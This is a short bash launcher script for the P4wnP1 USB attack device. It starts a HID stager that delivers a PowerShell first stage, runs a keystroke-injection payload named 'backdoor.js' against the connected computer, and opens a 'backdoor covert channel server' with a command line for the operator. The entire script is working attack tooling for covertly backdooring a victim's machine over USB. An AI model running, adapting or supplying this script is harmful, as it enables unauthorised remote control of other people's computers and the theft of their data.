#!/bin/bash
hidraw=$(P4wnP1_cli usb get device raw)

if [ "$hidraw" = "" ]; then
        echo "[!] No raw HID device found, aborting";
        exit
fi


echo "[*] Kill old hidstager processes..."
ps -aux | grep hidstager.py | grep -v grep | awk {'system("kill "$2)'}
echo "[*] Starting HID stager for backdoor covert channel payload..."
python2 /usr/local/P4wnP1/scripts/backdoor/hidstager.py -s -i /usr/local/P4wnP1/scripts/backdoor/Stage1.ps1 -o $hidraw &
P4wnP1_cli hid run -n backdoor.js > /dev.null

if ! ps -aux | grep P4wnP1.py | grep -q -v grep; then
        echo "[*] Start backdoor covert channel server and attach to screen session..."
        touch /tmp/device_hid_mouse
        screen -dmS backdoor bash -c "python2 /usr/local/P4wnP1/scripts/backdoor/P4wnP1.py"
        echo "[+] Type \"screen -d -r backdoor\" to switch to backdoor cli"
else
        echo "[!] HID covert channel server already running"
fi

